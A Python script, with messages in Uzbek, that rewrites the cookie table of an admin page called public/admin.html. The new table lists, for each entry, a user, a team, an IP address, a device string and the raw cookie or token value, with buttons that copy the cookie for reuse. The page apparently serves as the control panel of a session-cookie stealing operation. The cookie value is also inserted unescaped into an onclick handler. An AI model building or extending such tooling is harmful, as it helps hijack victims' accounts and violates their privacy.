with open('public/admin.html', 'r', encoding='utf-8') as f:
    lines = f.read().split('\n')

start_idx = -1
end_idx = -1

for i, line in enumerate(lines):
    if "document.getElementById('cookiesBody').innerHTML = res.cookies.map(" in line:
        start_idx = i
    if start_idx != -1 and i >= start_idx and ").join(" in line:
        end_idx = i
        break

if start_idx != -1 and end_idx != -1:
    replacement = """    document.getElementById('cookiesBody').innerHTML = res.cookies.map(c => {
        const time = c.vaqt || c.time || c.createdAt || c.updatedAt || c.timestamp || c.date || '-';
        const user = c.foydalanuvchi || c.user || c.username || c.name || '-';
        const team = c.team || '-';
        const ip = c.ip || c.ipAddress || '-';
        const device = c.qurilma || c.device || c.userAgent || 'Noma`lum';
        const cookieVal = c.cookie || c.value || c.token || '-';
        
        let formatTime = time;
        if (time !== '-' && time.length > 10) {
            try {
                let d = new Date(time);
                if (!isNaN(d.getTime())) formatTime = d.toLocaleString('uz-UZ');
            } catch(e) {}
        }
        
        return `
        <tr style="transition: all 0.2s;" onmouseover="this.style.backgroundColor='#2a3441'" onmouseout="this.style.backgroundColor='transparent'">
            <td style="white-space: nowrap; font-size: 0.85em; cursor: pointer; color: #00E5FF;" onclick="navigator.clipboard.writeText(this.innerText); alert('Vaqt nusxalandi!')" title="Nusxalash uchun bosing">${formatTime}</td>
            
            <td style="font-weight: bold; color: #4A7FFF; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText); alert('Ism nusxalandi!')" title="Nusxalash uchun bosing">${user}</td>
            
            <td>${team}</td>
            
            <td style="max-width: 400px; word-break: break-all; white-space: normal !important; font-family: monospace; font-size: 0.85em; cursor: pointer;" onclick="navigator.clipboard.writeText('${cookieVal}'); alert('Cookie nusxalandi!')" title="Nusxalash uchun bosing">
                <div style="background: #1a2332; padding: 6px; border-radius: 4px; border: 1px dashed #4A7FFF;">${cookieVal}</div>
            </td>
            
            <td style="cursor: pointer; color: #fff;" onclick="navigator.clipboard.writeText(this.innerText); alert('IP nusxalandi!')" title="Nusxalash uchun bosing">${ip}</td>
            
            <td style="max-width: 250px; word-break: break-word; white-space: normal !important; font-size: 0.8em; color: #aaa; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText); alert('Qurilma nusxalandi!')" title="Nusxalash uchun bosing">${device}</td>
        </tr>
        `;
    }).join('');"""
    
    lines[start_idx:end_idx+1] = replacement.split('\n')
    
    with open('public/admin.html', 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines))
    print("✅ Vaqt ustuni tuzatildi va nusxalash xususiyati qo'shildi!")
else:
    print("❌ Kod bloki topilmadi.")
